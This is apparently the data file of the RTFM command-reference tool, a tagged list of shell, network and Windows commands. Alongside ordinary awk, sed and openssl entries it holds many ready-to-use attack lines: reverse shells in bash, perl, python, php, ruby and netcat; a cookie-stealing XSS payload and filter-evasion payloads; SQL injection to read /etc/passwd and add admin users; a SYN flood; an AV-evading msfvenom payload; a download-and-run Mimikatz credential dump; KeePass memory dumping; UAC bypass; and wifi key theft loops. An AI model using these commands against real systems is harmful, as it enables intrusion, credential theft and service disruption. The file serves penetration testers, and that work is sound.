rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
Helpception, search for a command with two tags and a comment
EOC
linux
EOT
https://github.com/leostat/rtfm
EOR
awk /^[TERM]/ '{print "See the",$1,"at the",$3}' words.txt
Use only the lines that match a given RegEX [TERM]
EOC
linux
bash
text manipulation
EOT
http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
EOR
awk '{print "Avg for",$1,"is",($2+$3+$4)/3}' grades.txt
Calculations using AWK. AWK is a huge language, not just for printing columns
EOC
linux
bash
text manipulation
EOT
http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
EOR
awk 'NR==1;END{print}' file.txt
Print first and last lines of a file
EOC
linux
bash
text manipulation
EOT
http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
EOR
awk -F ";" '{print $2}' file.txt
Split the file on ; instead of space
EOC
Linux
bash
text manipulation
EOT
http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
EOR
awk '/start_pattern/,/stop_pattern/' file.txt
Print a portion of the text
EOC
Linux
bash
text manipulation
EOT
http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
EOR
show system mode
show mode of as500
EOC
cisco
EOT
http://www.cisco.com/c/en/us/td/docs/server_nw_virtual/2-5_release/command_reference/show.html#wp1128243
EOR
interface GigabitEthernet7; switchport trunk allowed vlan add 2
add vlan to your interface
EOC
cisco
networking
EOT
http://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus5000/sw/configuration/guide/cli/CLIConfigurationGuide/AccessTrunk.html
EOR
cvs diff <file>
diff file in cvs
EOC
bash
linux
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
cvs log <file>
show history of files
EOC
linux
bash
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk '{print $NF}') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m "Reverted to previous version" $file
roll back cvs change
EOC
linux
bash
loop
EOT
http://tulrich.com/geekstuff/cvs.html
EOR
find -L . -type l
find broken symlinks
EOC
linux
bash
EOT
https://www.cyberciti.biz/faq/linux-unix-find-files-with-symbolic-links/
EOR
chkconfig --list
List services started on boot
EOC
linux
EOT
https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/s2-services-chkconfig.html
EOR
screen -D -R [ID]
Hijack screen
EOC
linux
bash
EOT
https://www.cyberciti.biz/tips/linux-screen-command-howto.html
EOR
ssh -R [lport]:[rip]:[rport] [ip] -N
Forward the remote port to the local machine
EOC
linux
bash
networking
pivoting
EOT
http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
EOR
ssh -L [lport]:[rip]:[rport] [ip] -N
Forward the local port to the remote machine
EOC
linux
bash
networking
pivoting
EOT
http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
EOR
dd if=/dev/zero of=1g.img count=1M bs=1K
1Gig of zeros
EOC
linux
files
bash
EOT
https://www.cyberciti.biz/faq/linux-unix-dd-command-show-progress-while-coping/
EOR
chage -l root
get password policy for root
EOC
linux
bash
passwords
enumeration
user information
EOT
http://www.thegeekstuff.com/2009/04/chage-linux-password-expiration-and-aging/
EOR
while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
Display system clock in terminal top right corner! :-)
EOC
linux
loop
bash
interesting
EOT
http://www.computerhope.com/unix/utput.htm
EOR
smartctl -d megaraid,0 -x /dev/sda
display disk info
EOC
linux
EOT
https://www.cyberciti.biz/tips/linux-find-out-if-harddisk-failing.html
EOR
hping3 -1 [ip]
icmp ping
EOC
linux
bash
networking
EOT
http://wiki.hping.org/
EOR
hping3 -8 [port]-[port] -S [ip] -V
syn scan port range with hping
EOC
Linux
bash
networking
scanning
EOT
http://wiki.hping.org/
EOR
hping3 -A [ip] -p [port]
ACK scan on port
EOC
Linux
bash
networking
scanning
EOT
http://wiki.hping.org/
EOR
hping3 -2 [ip] -p [port ]
udp port scan
EOC
Linux
bash
networking
EOT
http://wiki.hping.org/
https://www.cyberciti.biz/tips/howto-linux-iptables-bypass-firewall-restriction.html
EOR
hping3 -Q [ip] -p [port] -s
Get initial sequence number
EOC
linux
bash
networking
EOT
http://wiki.hping.org/
EOR
hping3 -S [ip] -p [port] --tcp-timestamp
get remote timestamp
EOC
Linux
bash
enumeration
networking
EOT
http://wiki.hping.org/
EOR
hping3 -F -p -U [ip] -p [port]
Xmas' scan
EOC
Linux
bash
networking
scanning
EOT
http://wiki.hping.org/
EOR
hping3 -1 [ip].x --rand-dest -I em1
Sweep range for up hosts ie 192.168.1.x
EOC
Linux
bash
networking
EOT
http://wiki.hping.org/
EOR
hping3 -9 HTTP -I em1
Intercept all http
EOC
Linux
bash
networking
EOT
http://wiki.hping.org/
EOR
hping3 -S [victim] -a [gw] -p [port] --flood
Syn flood victim
EOC
Linux
bash
networking
interesting
EOT
http://wiki.hping.org/
EOR
display interface brief
hp switch show if info
EOC
networking
hp
EOT
http://www.h3c.com.hk/technical_support___documents/technical_documents/wlan/access_point/h3c_wa2200_series_wlan_access_points/command/command/h3c_wa_wlan_access_cr-6w100/03/201009/691873_1285_0.htm
EOR
GET //google.com
get google
EOC
Linux
bash
EOT
https://www.lifewire.com/get-linux-command-4093526
EOR
hydra -L ~/pentest/lists/users-common.txt -P ~/pentest/lists/500-worst-passwords.txt -t 1 -e ns -f -vV <destination> http-get /
Brute HTTP with hydra -s 443 for ssl
EOC
Linux
brute
http
EOT
https://www.aldeid.com/wiki/Thc-hydra#Usage
EOR
if [ $carprice -gt 20000]; then echo "too much"; else echo "ok"; fi
bash if
EOC
Linux
bash
EOT
http://www.thegeekstuff.com/2010/06/bash-conditional-expression
https://bash.cyberciti.biz/guide/If..else..fi
EOR
<script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); i.send();</script>
Grab the cookie
EOC
web application
XSS
cookies
EOT
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://excess-xss.com/
EOR
meterpreter> execute -f cmd.exe -i -H
executes a command on the remote machine (i.e. opens up a command shell)
EOC
metasploit
EOT
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
EOR
nmap -sS -P0 -T4 -n -iL info/ips.txt -oA nmap/quick-scan
Quick scan to set us off
EOC
networking
scanning
EOT
https://wiki.archlinux.org/index.php/Nmap
EOR
nmap -sS -P0 -T4 -Pn -n -iL info/ips.txt -oA nmap/quick-scan
Quick scan of all the hosts (ignore pinging)
EOC
networking
scanning
EOT
https://wiki.archlinux.org/index.php/Nmap
EOR
nmap -sS -P0 -T4 -p0-65535 -n -g 80 -iL info/ips.txt -oA nmap/source-port
Source port spoofing
EOC
networking
scanning
EOT
https://wiki.archlinux.org/index.php/Nmap
EOR
nmap -sS -sU -T4 -Pn -p0-65535 -n -iL info/ips.txt -oA nmap/all-ports
All port scan : assume up
EOC
networking
scanning
EOT
https://wiki.archlinux.org/index.php/Nmap
EOR
nmap -sS -P0 -T4 -n -A -iL info/ips.txt -oA nmap/os-discovery
OS Detection
EOC
networking
scanning
EOT
https://wiki.archlinux.org/index.php/Nmap
EOR
nmap -sS -P0 -T5 -n -p 1433 -iL info/ips.txt -oA nmap/internal-sqls
Find sql servers
EOC
networking
scanning
EOT
https://wiki.archlinux.org/index.php/Nmap
EOR
openssl x509 -noout -modulus -in [CERT] | openssl md5
# Verify the certificate / private key association
EOC
Linux
bash
certificates
EOT
https://www.sslshopper.com/article-most-common-openssl-commands.html
EOR
openssl x509 -in certificate.crt -text
https://www.sslshopper.com/article-most-common-openssl-commands.html
EOC
Linux
bash
certificates
EOT
https://www.sslshopper.com/article-most-common-openssl-commands.html
EOR
echo "" | openssl s_client -connect [ip]:443 2>/dev/null| grep ^subject | sed 's/^.*CN=//'
Grab the hostname in the certificate
EOC
Linux
bash
certificates
EOT
https://www.sslshopper.com/article-most-common-openssl-commands.html
EOR
ifconfig eth0 hw ether 00:E0:81:5C:B4:0F
Change MAC address
EOC
Linux
bash
networking
stealth
EOT
https://www.cyberciti.biz/faq/linux-change-ip-address/
EOR
ip route show to match [IP]
How will the sytem route traffic to [IP]
EOC
Linux
bash
networking
EOT
http://baturin.org/docs/iproute2/
EOR
route -n
Depricated way of showing routing table, please see the IP command
EOC
Linux
bash
networking
EOT
http://baturin.org/docs/iproute2/
EOR
skipfish -O -MEU -o results-nonauth -W ~/pentest/wordlists/skipfish.wl -k 00:30:00 https://[ip]
Skipfish scanner
EOC
web application
scanning
EOT
https://github.com/spinkham/skipfish
EOR
curl -D - --proxy1.0 [ip]:80 -m 2 [url]
Curl through a proxy (-m = timeout)
EOC
Linux
bash
web application
EOT
http://www.thegeekstuff.com/2012/04/curl-examples/
EOR
curl -k --cookie "[cookie]" [url] --silent | grep "<title>"
Curl with cookie
EOC
Linux
bash
web application
EOT
http://www.thegeekstuff.com/2012/04/curl-examples/
EOR
smbclient -I [IP] -L [domain] -N -U ""
Null session smb
EOC
Linux
smb
bash
EOT
https://www.cyberciti.biz/faq/access-windows-shares-from-linux/
https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
EOR
snmpwalk -v 1 -c public [TARGET]
Default community string in SNMP
EOC
Linux
bash
brute
scanning
EOT
http://net-snmp.sourceforge.net/docs/man/snmpwalk.html
EOR
ettercap -M arp -T -i em1 -L log /[TARGET]//
Ettercap arp poisoning
EOC
Linux
networking
MitM
EOT
https://ettercap.github.io/ettercap/
EOR
fierce -threads 10 -dns [domain] -wordlist [wordlist] -dnsserver 8.8.8.8 -file fierce.txt
Fierce (v0.9) - DNS bruteforcer
EOC
Linux
networking
scanning
dns
EOT
https://github.com/mschwager/fierce
ha.ckers.org/fierce/
EOR
lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4
recover file after being deleted
EOC
Linux
bash
interesting
EOT
https://www.cyberciti.biz/tips/linux-ext3-ext4-deleted-files-recovery-howto.html
EOR
rpm -qa | less
list installed programs
EOC
Linux
bash
package management
EOT
https://www.linux.com/blog/rpm-commands
EOR
echo "hello fredrick" | sed 's/.\{4\}$//'
remove 4 chars
EOC
Linux
bash
text manipulation
EOT
http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
EOR
cat db.schema | sed G
add space after each line
EOC
Linux
bash
text manipulation
EOT
http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
EOR
sed 's/ *$//;s/$/;/' linkedin.txt | paste - - - - | tr -d '\t'
convert a list into a multi line CSV
EOC
Linux
bash
text manipulation
EOT
http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
EOR
sed -i '/^[0-9]/ s/^/sshd: /' /etc/hosts.allow
# Add to the beginning of the line starting with a pattern
EOC
Linux
bash
text manipulation
EOT
http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
EOR
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash reverse shell
EOC
Linux
bash
reverse shells
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl reverse shell
EOC
Linux
Windows
reverse shells
perl
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python reverse shell
EOC
Linux
Windows
reverse shells
python
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
php reverse shell : php from the CLI
EOC
Linux
Windows
reverse shells
php
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby reverse shell
EOC
Linux
Windows
reverse shells
ruby
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
nc -e /bin/sh 10.0.0.1 1234
net cat reverse shell
EOC
Linux
Windows
reverse shells
EOT
https://highon.coffee/blog/reverse-shell-cheat-sheet/
EOR
null union all select load_file('/etc/passwd')/*
Load a file with MYSQL
EOC
web application
sql injection
mysql
EOT
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheets
EOR
exec sp_configure 'xp_cmdshell', 1 go reconfigure
enable xp_cmdshell
EOC
web application
sql injection
shell
mssql
EOT
http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
EOR
create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor;
oracle add user
EOC
web application
sql injection
Oracle
EOT
http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
EOR
insert into mysql.user (user, host, password) values ('victor', 'localhost', password('pass123'))
mysql add user
EOC
web application
sql injection
mysql
EOT
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
EOR
exec sp_addlogin 'victor', 'pass123';  exec sp_addsrvrolemember 'victor', 'sysadmin'
mssql add user
EOC
web application
sql injection
mssql
EOT
http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
EOR
# rm -rf `which nano`; ln -s `which vim` /usr/bin/nano
Fix nano <3 ;)
EOC
Files
bash
interesting
text manipulation
EOT
https://xkcd.com/378/
EOR
net start
list windows services
EOC
Windows
enumeration
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
EOR
net accounts
list windows password requirements : add /domain for AD
EOC
Windows
enumeration
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
EOR
net accounts /domain
password requirements domain
EOC
enumeration
windows
users
EOT
https://technet.microsoft.com/en-us/library/bb490949.aspx
EOR
reaver -i mon0 -c <channel> -b <bssid> -vv
try to reave WPS wifi
EOC
brute
wireless
wifi
EOT
http://tools.kali.org/wireless-attacks/reaver
EOR
<%div style="xss:expression(alert(123))">
.net xss filter evasion
EOC
web application
XSS
EOT
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
EOR
<IMG SRC=j&#X41vascript:alert('test2')>
.net xss filter evasion
EOC
XSS
web appplication
EOT
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
EOR
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi
UTF7 xss
EOC
web application
XSS
EOT
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
EOR
sl
not ls
EOC
Linux
bash
interesting
EOT
https://www.cyberciti.biz/tips/displays-animations-when-accidentally-you-type-sl-instead-of-ls.html
EOR
command="[cmd]";echo -n xdotool key " "; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed 's#>#greater#g'| sed 's#+#plus#g' | sed 's#"#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter
Abuse open x11 : Think open term add user add key ;)
EOC
Linux
bash
interesting
EOT
https://necurity.co.uk
https://ubuntuforums.org/archive/index.php/t-1970619.html
EOR
echo 1 > /sys/module/usbcore/parameters/old_scheme_first
WIFI enable USB2 before USB3 : helps with passthrough
EOC
Linux
wireless
wifi
configuration
EOT
http://forums.fedoraforum.org/archive/index.php/t-30868.html
EOR
airodump-ng -f 4000  --cswitch 1 --band abg  wlan0mon --output-format csv -w WifiOverview
WIFI : Scan the range in an orderly manner
EOC
enumeration
wireless
wifi
EOT
https://www.aircrack-ng.org/doku.php?id=airodump-ng
EOR
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up;
WIFI : Enable monitor mode on interface
EOC
Linux
networking
wireless
wifi
EOT
https://www.aircrack-ng.org/doku.php?id=airodump-ng
EOR
yaps.exe -start -start_address [victim] -stop_address [victim] -start_port [port] -stop_port [port] -timeout 5 -resolve n
Yaps windows portscan, upload first duh
EOC
Windows
networking
scanning
EOT
http://www.steelbytes.com/?mid=19
EOR
cat json.txt | sed "s/false/§false§/g" | sed "s/true/§true§/g" | sed "s/null/§null§/g" | sed "s/:\"/:\"§/g" | sed "s/\",/§\",/g" | sed "s/\"}/§\"}/g" | sed "s/\\[\\]/\\[§§\\]/g"
Burpify JSON request
EOC
bash
interesting
web application
text manipulation
EOT
https://www.yg.ht/
EOR
<script src=//[ip]>
mini xss
EOC
web application
XSS
EOT
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
EOR
./msfvenom -p windows/meterpreter/reverse_https -f dll -e x86/shikata_ga_nai -i 30 LHOST=[IP] LPORT=443 > /data/Clients/[FILE]
MSF Venom make dll
EOC
metasploit
av evasion
EOT
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
EOR
runas /user:[DOM]\[USER] [EXE]
Windows run as
EOC
Windows
EOT
https://technet.microsoft.com/en-gb/library/bb490994.aspx
EOR
accesschk.exe -uwcqv "Authenticated Users" *
Priv esc check weak service perms, you may need an older version for older windows!
EOC
Windows
enumeration
EOT
https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx
EOR
Set-ExecutionPolicy unrestricted
powershell bypass block
EOC
Windows
powershell
EOT
https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
EOR
powershell.exe -noprofile -executionpolicy bypass
powershell bypass block
EOC
Windows
powershell
EOT
https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
EOR
for host in $(cat ../nmap/[IP File]); do echo "Trying $host"; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done
loop to find user shares
EOC
loop
smb
bash
enumeration
EOT
https://yg.ht
https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
EOR
powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
Invoke mimicatz, can use with psexec for pwnage
EOC
Windows
passwords
av evasion
powershell
EOT
http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
EOR
procdump.exe -accepteula -ma keepass.exe keepass.dmp
Dump a processes memory for offline abuse
EOC
Windows
memory
EOT
https://sourceforge.net/p/keepass/feature-requests/1907/
EOR
setenforce permissive
kill puppies, you monster (disable SElinux, though seriously just work around it)
EOC
Linux
EOT
https://stopdisablingselinux.com/
EOR
for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host 'WMIC ComputerSystem Get UserName'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v "^\[" | grep -v "^Impacket" | grep -v "^Trying" | grep -v "SMB SessionError" | sed '/^$/d'
loop for who is where
EOC
loop
smb
enumeration
user information
impacket
EOT
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
https://yg.ht
EOR
Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv
Powershell password last changed, run on DC
EOC
Windows
enumeration
powershell
user information
EOT
https://yg.ht
https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_running_on_a_regular/
EOR
dnscmd 127.0.0.1 /ZoneExport [FQDN] [OUT].zone
dump dns zone on DC
EOC
Windows
dns
enumeration
EOT
https://yg.ht
https://technet.microsoft.com/en-us/library/cc772069(v=ws.11).aspx
EOR
mount -t cifs \\\\[victim]\\SYSVOL$ -o username=[user],password=[password] mount/; nautilus mount/;
Mount Sysvol share (hosted on the DC)
EOC
Linux
Files
smb
filesystem
EOT
https://www.cyberciti.biz/faq/linux-mount-cifs-windows-share/
EOR
egrep -r "cpassword|net" mount
Look in 'mount' for share (mount sysvol first)
EOC
Linux
smb
enumeration
EOT
https://blogs.technet.microsoft.com/ash/2014/11/10/dont-set-or-save-passwords-using-group-policy-preferences/
EOR
for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host "ipconfig"; done | grep "IPv4 Address\|Ethernet adapter\|^[0-9]" | sed '/^$/d' | tee dualhomed-search.txt
loop to look for dual homed hosts
EOC
loop
networking
enumeration
impacket
EOT
https://yg.ht
https://technet.microsoft.com/en-gb/library/bb490921.aspx
EOR
for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information
loop to find local admins
EOC
Linux
loop
enumeration
user information
impacket
EOT
https://technet.microsoft.com/en-us/library/bb490706.aspx
EOR
egrep -v "(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)" local_admin_information | egrep -v "(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)" | grep -v "Alias name" | grep -v "Administrators have complete" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v "^$" | sed s/"\[\*\] Creating service.*on"/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/"^ "/"€"/g | sed s/'The command completed successfully.'/€/g | tr "\n" "," | tr € "\n" | grep -v "^$" | sort | uniq  > local_admins.csv
turn loop for local admins into csv
EOC
linux
loop
bash
interesting
text manipulation
user information
EOT
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
EOR
tsql -S [IP] -U sa -P"[PASS]"
connect to mssql
EOC
Linux
mssql
EOT
https://linux.die.net/man/1/tsql
EOR
/opt/impacket/examples/mssqlclient.py [user]:[pass]@[ip] -port [port]
connect to mssql
EOC
Linux
mssql
impacket
EOT
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
EOR
c:\windows\system32\inetsrv\appcmd.exe list apppool "SharePoint Central Administration v4" /text:ProcessModel.Password
Recover IIS password
EOC
Windows
passwords
enumeration
IIS
EOT
https://yg.ht
https://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
EOR
netdom query trust
get domain trusts
EOC
Windows
enumeration
EOT
https://yg.ht
https://technet.microsoft.com/en-us/library/cc772217(v=ws.11).aspx
EOR
netsh interface portproxy show all
show native port forwards windows
EOC
Windows
networking
EOT
https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
EOR
netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip]
set native port forward windows
EOC
Windows
networking
pivoting
EOT
https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
EOR
netsh interface portproxy reset
reset native port forward windows
EOC
Windows
networking
pivoting
EOT
https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
EOR
sc query "MpsSvc"
windows firewall status
EOC
Windows
enumeration
EOT
https://yg.ht
https://technet.microsoft.com/en-gb/library/bb490995.aspx
https://technet.microsoft.com/en-us/library/dd228922(v=ws.11).aspx
EOR
netsh advfirewall firewall
windows firewall status
EOC
Windows
enumeration
EOT
https://yg.ht
https://technet.microsoft.com/en-us/library/bb490939.aspx
EOR
tasklist /v
Windows process list
EOC
Windows
enumeration
process management
privilege escalation
EOT
https://technet.microsoft.com/en-gb/library/bb491010.aspx
EOR
taskkill /f /im [PROCESS]
Windows force kill process
EOC
Windows
process management
EOT
https://technet.microsoft.com/en-gb/library/bb491010.aspx
EOR
netstat -a | find "LISTENING"
Windows list listening ports
EOC
Windows
networking
enumeration
EOT
http://Microsoft.com
EOR
tasklist /FI "IMAGENAME eq [process].exe" /V
Windows open files
EOC
Windows
Files
enumeration
EOT
https://technet.microsoft.com/en-gb/library/bb491010.aspx
EOR
bypassuac.exe /c [COMMAND]
ByPassUAC
EOC
Windows
EOT
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac.rb
EOR
at [TIME] command.exe /s cmd SYSCMD
Scheduled cmd to run
EOC
Linux
Windows
bash
EOT
https://technet.microsoft.com/en-gb/library/bb490866.aspx
https://www.lifewire.com/linux-command-at-4091646
EOR
for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host "cmd.exe"; done
loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec
EOC
Linux
loop
remote command shell
impacket
EOT
https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
EOR
psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
PSExec with hashses
EOC
Linux
remote command shell
hashes
impacket
EOT
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
EOR
rpcclient -U '[DOMAIN]\[USER]'%'[PASS]' '[TARGET]' -c enumdomusers,enumdomgroups
RPCClient smb show users and groups
EOC
linux
smb
enumeration
user information
EOT
https://www.samba.org/samba/docs/man/manpages/rpcclient.1.html
EOR
name=sslfile;openssl genrsa -out $name.key 2048;openssl req -new -key $name.key -out $name.csr; openssl x509 -req -days 10 -in $name.csr -signkey $name.key -out $name.crt;openssl pkcs12 -export -clcerts -in $name.crt -inkey $name.key -out $name.p12;openssl pkcs12 -in $name.p12 -out $name.pem -clcerts
Create Self-signed cert / key
EOC
Linux
bash
certificates
EOT
https://yg.ht
https://www.sslshopper.com/article-how-to-create-a-self-signed-certificate.html
EOR
wmic service get name,displayname,pathname,startmode
Unquoted Service Paths
EOC
Windows
enumeration
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
EOR
sc query
Unquoted Service Paths
EOC
Windows
enumeration
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
EOR
sc qc "[SERVICE]"
Unquoted Service Paths
EOC
Windows
enumeration
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
EOR
sc config "[SERVICE]" start= auto
Unquoted Service Paths, start service
EOC
Windows
enumeration
privilege escalation
EOT
http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
EOR
sc config "[SERVICE]" start= disabled
Unquoted Service Paths
EOC
Windows
enumeration
EOT
http://www.fuzzysecurity.com/tutorials/16.html
http://pentestmonkey.net/tools/windows-privesc-check
EOR
Sub Test();Shell ("powershell");End Sub
VBA launching command
EOC
Windows
EOT
https://yg.ht
https://support.smartbear.com/testcomplete/docs/testing-with/advanced/using-external-functions/running-powershell-scripts.html
EOR
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("out.exe");>wget.js
Javascript wget windows oneline : cscript /nologo wget.js http://[IP]
EOC
Windows
Files
pivoting
EOT
http://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-is-doing
EOR
netsh wlan show profile
Windows Wireless
EOC
Windows
networking
passwords
enumeration
wireless
wifi
EOT
http://Microsoft.com
EOR
Netsh wlan show profile name="[SSID]" key=clear
Windows Wireless
EOC
Windows
networking
passwords
wireless
wifi
EOT
https://www.labnol.org/software/find-wi-fi-network-password/28949/
EOR
for host in $(cat localsubnet.txt); do echo "Trying $host"; winexe --user [Domain]/[user]%[pass] //$host "netsh wlan export profile name=[PROFILE] key=clear"; done
loop dump wifi keys
EOC
loop
bash
passwords
enumeration
wireless
wifi
EOT
https://yg.ht
https://www.labnol.org/software/find-wi-fi-network-password/28949/
EOR
run autoroute -s [CIDR SUBNET]
proxy Metasploit pivot
EOC
metasploit
pivoting
EOT
http://Microsoft.com
EOR
run autoroute -p
proxy metasploit pivot
EOC
metasploit
pivoting
EOT
https://www.offensive-security.com/metasploit-unleashed/pivoting/
EOR
background it then run...
proxy Metasploit pivot
EOC
metasploit
pivoting
EOT
https://www.offensive-security.com/metasploit-unleashed/pivoting/
EOR
use auxiliary/server/socks4a
proxy Metasploit pivot
EOC
metasploit
pivoting
EOT
https://www.offensive-security.com/metasploit-unleashed/pivoting/
EOR
proxychains cmd
proxy pivot
EOC
metasploit
pivoting
